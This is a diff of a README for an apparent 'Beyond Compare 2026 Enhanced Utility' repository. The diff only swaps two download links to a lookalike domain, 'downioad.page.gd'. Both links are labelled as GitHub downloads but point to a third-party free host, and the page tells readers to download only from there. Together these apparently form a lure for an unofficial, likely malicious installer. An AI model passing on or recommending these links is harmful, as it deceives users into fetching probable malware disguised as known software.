@@ -2,7 +2,7 @@
 
 This repository offers the Beyond Compare 2026 Enhanced Utility, a powerful and versatile tool designed for precise file and folder comparison and synchronization on Windows 10 and Windows 11. Whether you're a developer, administrator, or power user, this tool enhances your workflow by providing intuitive interfaces and advanced features for managing files efficiently.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -64,6 +64,6 @@ For support, you can refer to the official documentation on the Beyond Compare w
 
 ## Download
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 Please ensure you download only from the provided link to avoid unauthorized sources.
